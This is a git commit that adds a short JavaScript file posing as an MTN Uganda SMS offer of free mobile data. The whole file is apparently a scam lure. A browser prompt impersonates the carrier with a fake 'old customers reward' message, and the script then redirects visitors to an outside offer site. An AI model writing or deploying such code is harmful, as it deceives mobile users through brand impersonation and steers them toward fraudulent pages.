2c6dbeeced546d7000d0112d39ccf4a10e9d9575
ekpesense <abantak9@gmail.com>
2025-02-20 23:15:22 -0800

    Create activation-5gb-unlimited-free-data.js

---
+++ activation-5gb-unlimited-free-data.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('MTN UGANDA SMS: Dear customer, Kindly Check If Your MTN Uganda Sim Card Is Qualify To Receive From 5GB To Unlimited Data, Old Customers Reward, Press FREE DATA To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://offer-fest.info/5gb-unlimited-free-data';
+}
